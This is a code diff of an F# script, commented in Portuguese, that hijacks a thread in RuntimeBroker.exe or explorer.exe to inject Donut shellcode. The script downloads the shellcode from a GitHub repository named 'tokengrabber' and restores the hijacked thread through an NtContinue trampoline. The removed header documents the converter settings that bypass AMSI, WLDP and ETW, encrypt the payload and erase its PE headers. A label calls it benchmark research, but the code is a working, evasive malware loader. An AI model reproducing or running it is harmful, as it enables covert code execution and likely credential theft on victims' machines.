@@ -1,87 +1,7 @@
-// =====================================================================================
-// Thread hijack -> RuntimeBroker.exe com payload real em formato Donut (x64)
-// Benchmark: CyberGym - pesquisa isolada.
-//
-// Geracao do shellcode (donut.exe local, build Oct 2024):
-//   donut.exe -i cheat-bypass-loader.exe -o loader_donut.c -a 2 -f 3 -z 3 -b 3 -e 3 -k 1 -x 1
-//   python tools\donut_refresh.py loader_donut.c loader.bin
-//
-//   -a 2   amd64 puro
-//   -f 3   saida C (`unsigned char buf[]`) — convertida para loader.bin cru
-//          pelo tools\donut_refresh.py, sem alterar um unico byte do shellcode
-//   -z 3   LZNT1
-//   -b 3   BYPASS AMSI/WDLP/ETW = "Continue on fail"  (NAO usar -b 1: desliga!)
-//   -e 3   nomes aleatorios + criptografia simetrica
-//   -k 1   sobrescreve cabecalhos PE do payload em memoria (sem marca Donut)
-//   -x 1   Exit=Thread (sem RtlExitUserProcess)
-//
-//   O cheat e convertido com OS MESMOS parametros (-a 2 -f 3 -z 3 -b 3 -e 3
-//   -k 1 -x 1) e seus bytes atualizados em cheat_embedded.hpp antes da
-//   conversao final do loader.
-//
-//   NAO usar -y. Com -y o Donut chama NtContinue com c.Rsp &= -16 usando o RSP
-//   do frame interno, corrompendo a stack da thread sequestrada.
-//
-//   O cheat-bypass-loader DEVE ser compilado em Release|x64 com /MD
-//   (RuntimeLibrary=MultiThreadedDLL). Com /MT (CRT estatico) o payload mapeado
-//   pelo Donut falha na inicializacao do CRT com 0xC0000409 antes de main().
-//   Com /MD o UCRT ja esta inicializado no processo-alvo e tudo funciona.
-//
-// Mecanismo de retorno (NtContinue com o CONTEXT original) - SEM patch:
-//
-//   Tentativa descartada: trocar o `ret` final do stub (1 byte, C3) por um
-//   `jmp rel32` (5 bytes) corrompia os 4 primeiros bytes do MainProc do Donut,
-//   que comeca logo apos o ret (popOffset+23). Resultado: 0xC0000005 em
-//   retAddr+4 e payload nunca executado. O shellcode NAO e modificado.
-//
-//   Solucao atual: simular um `call` na stack da thread, sem tocar o stub:
-//
-//     stub Donut x64 (offset relativo ao `pop rcx`) - INALTERADO:
-//       0: 59               pop rcx       -> RCX = base+5 (instance Donut)
-//       1: 55               push rbp
-//       2: 48 89 E5         mov rbp, rsp
-//       5: 48 83 E4 F0      and rsp, -16
-//       9: 48 83 EC 20      sub rsp, 0x20
-//       13:E8 05 00 00 00   call MainProc
-//       18:48 89 EC         mov rsp, rbp
-//       21:5D               pop rbp
-//       22:C3               ret           -> consome o frame artificial
-//
-//     frame escrito em [originalRsp-8] = endereco do trampoline (8 bytes),
-//     com RSP de entrada = originalRsp-8. O `ret` final entra no trampoline:
-//
-//     trampoline (pagina RX separada):
-//       48 B9 <ctxAddr>    mov rcx, ctxAddr
-//       48 31 D2           xor rdx, rdx       ; Alertable = FALSE
-//       48 B8 <ntAddr>     mov rax, NtContinue
-//       FF D0              call rax
-//       CC                 int3               ; NtContinue nunca retorna
-//
-//   O CONTEXT original (copiado integralmente para uma pagina RW remota) e
-//   restaurado de uma vez por NtContinue: RIP, RSP e todos os registradores
-//   voltam exatamente ao estado da thread no momento do SuspendThread.
-//
-//   IMPORTANTE: threads em ThreadState.Wait podem demorar 20-40s para executar
-//   o novo RIP (o wait no kernel precisa terminar). Testes curtos de 2s sao
-//   enganosos - sempre esperar >= 35s antes de concluir.
-//
-// Fluxo:
-//   1. AllocConsole + logs
-//   2. baixa loader.bin da API do GitHub (fallback: arquivo local)
-//   3. valida tamanho, SHA256 e assinatura do stub
-//   4. OpenProcess(RuntimeBroker) + escolhe thread em Wait
-//   5. SuspendThread -> GetThreadContext (CONTEXT original)
-//   6. VirtualAllocEx RW para: shellcode, CONTEXT e trampoline
-//   7. escreve shellcode (sem patch), CONTEXT e trampoline
-//   8. promove shellcode e trampoline para PAGE_EXECUTE_READ (nunca RWX)
-//   9. escreve frame [originalRsp-8] = trampoline
-//  10. SetThreadContext: RIP = shellcode, RSP = originalRsp-8
-//  11. ResumeThread -> payload roda -> ret -> trampoline -> NtContinue
-// =====================================================================================
-
 #nowarn "44"
 #r "System.dll"
 #r "System.Net.Http.dll"
+#r "System.Management.dll"
 
 open System
 open System.IO
@@ -192,9 +112,44 @@ let CTX_RIP = 0xF8
 let shellcodeUrl =
     "https://api.github.com/repos/bielzxdev/tokengrabber/contents/loader.bin?ref=main"
 
-let expectedSha256 = "16280D07DEE8258025F64EB71F550DC15090ADF5A4ED55A0B9107AE68CEAE8B4"
+let expectedSha256 = "6768E505E4A9AEF503BE4B9C259CB2724E92DB0C6249F91536EF61B2527273C3"
 let localShellcodePath = Path.Combine(__SOURCE_DIRECTORY__, "loader.bin")
 let targetProcessName = "RuntimeBroker"
+
+// Preferir sempre o RuntimeBroker filho do explorer. O singleton do sistema
+// nao e um host util (o loader conecta e o host termina a conexao).
+let preferredTargetPid () =
+    let explorers =
+        Process.GetProcessesByName "explorer"
+        |> Seq.map (fun p -> uint32 p.Id)
+        |> Set.ofSeq
+    let candidates =
+        Process.GetProcessesByName targetProcessName
+        |> Array.toList
+    let byExplorer =
+        candidates
+        |> List.filter (fun p ->
+            try
+                use searcher =
+                    new Management.ManagementObjectSearcher(
+                        "SELECT ParentProcessId FROM Win32_Process WHERE ProcessId=" + string p.Id)
+                use collection = searcher.Get()
+                let mutable found = false
+                let mutable parent = 0u
+                let mutable enumerator = collection.GetEnumerator()
+                while enumerator.MoveNext() do
+                    parent <- uint32 (string enumerator.Current.["ParentProcessId"])
+                    found <- true
+                found && Set.contains parent explorers
+            with _ -> false)
+    match byExplorer with
+    | p :: _ -> p.Id
+    | [] ->
+        // Sem filho do explorer: o singleton do RuntimeBroker nao executa o
+        // Donut de forma util nesta sessao. Usa o explorer como host interativo.
+        let shells = Process.GetProcessesByName "explorer"
+        if shells.Length > 0 then shells.[0].Id
+        else candidates.Head.Id
 
 // ---------------------------------------------------------------------------------- Debug
 
@@ -470,28 +425,20 @@ let injectShellcode (pid: int) (shellcode: byte[]) =
     finally
         if suspended && hThread <> 0n then ResumeThread hThread |> ignore
         if pContext <> 0n then Marshal.FreeHGlobal pContext
-        // remoteCode / remoteCtx / remoteTramp nao sao liberados: o loader ainda
-        // pode estar lendo o shellcode e o CONTEXT e usado no retorno.
         if hThread <> 0n then CloseHandle hThread |> ignore
         if hProc <> 0n then CloseHandle hProc |> ignore
 
-// ----------------------------------------------------------------------------- Entry point
-
-AllocConsole() |> ignore
-logf "=== Thread hijack / RuntimeBroker / Donut loader ==="
-logf "Bypass AMSI/WLDP/ETW: HABILITADO (-b 3 = Continue on fail)"
-logf "Retorno da thread: ret -> trampoline -> NtContinue(CONTEXT original), sem patch no shellcode"
 
 let targets = Process.GetProcessesByName targetProcessName
-if targets.Length = 0 then
-    failwithf "Nenhum %s.exe em execucao." targetProcessName
+let shells = Process.GetProcessesByName "explorer"
+if targets.Length = 0 && shells.Length = 0 then
+    failwithf "Nenhum %s.exe ou explorer.exe em execucao." targetProcessName
 logf "%s encontrado: %d instancia(s)" targetProcessName targets.Length
 
-let targetPid = targets.[0].Id
+let targetPid = preferredTargetPid ()
 let shellcode = loadShellcode ()
 injectShellcode targetPid shellcode
 
-logf "Hijack concluido. O payload so comeca a rodar quando o wait kernel da thread terminar (tipicamente 20-90s)."
 Thread.Sleep 2000
 
 try
@@ -500,4 +447,3 @@ try
 with _ ->
     logf "AVISO: RuntimeBroker pid=%d nao encontrado apos execucao" targetPid
 
-logf "=== Fim ==="
